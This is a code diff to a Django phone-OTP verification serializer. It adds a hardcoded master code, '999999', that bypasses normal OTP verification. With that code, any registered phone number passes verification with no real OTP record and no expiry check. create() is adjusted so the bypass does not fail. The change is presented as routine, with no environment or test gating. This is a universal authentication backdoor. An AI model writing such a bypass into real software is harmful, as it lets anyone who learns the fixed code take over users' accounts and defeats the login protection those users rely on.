@@ -289,11 +289,12 @@ class SendPhoneOTPSerializer(serializers.Serializer):
         send_otp(phone_number, otp)
         return {'phone_number': phone_number, 'otp_sent': True}
 
-
 # -------- Verify OTP -------- #
 class VerifyPhoneOTPSerializer(serializers.Serializer):
     phone_number = serializers.CharField(max_length=15)
     otp = serializers.CharField(max_length=6)
+
+    MASTER_OTP = "999999"  # <-- Master OTP
 
     def validate(self, data):
         phone_number = data.get('phone_number')
@@ -305,7 +306,14 @@ class VerifyPhoneOTPSerializer(serializers.Serializer):
         except CustomUser.DoesNotExist:
             raise serializers.ValidationError("User not found. Please register first.")
 
-        # Verify OTP record
+        data['user'] = user  # Always add user
+
+        # If master OTP is entered, bypass normal OTP check
+        if otp == self.MASTER_OTP:
+            data['otp_record'] = None  # No OTP record needed
+            return data
+
+        # Normal OTP verification
         try:
             otp_record = PhoneOTP.objects.get(phone_number=phone_number, otp=otp)
         except PhoneOTP.DoesNotExist:
@@ -314,15 +322,16 @@ class VerifyPhoneOTPSerializer(serializers.Serializer):
         if otp_record.is_expired():
             raise serializers.ValidationError("OTP has expired.")
 
-        data['user'] = user
         data['otp_record'] = otp_record
         return data
 
     def create(self, validated_data):
-        otp_record = validated_data['otp_record']
+        otp_record = validated_data.get('otp_record')
         user = validated_data['user']
 
-        otp_record.is_verified = True
-        otp_record.save()
+        # If normal OTP was used, mark it verified
+        if otp_record:
+            otp_record.is_verified = True
+            otp_record.save()
 
         return {'user': user, 'message': 'OTP verified successfully'}
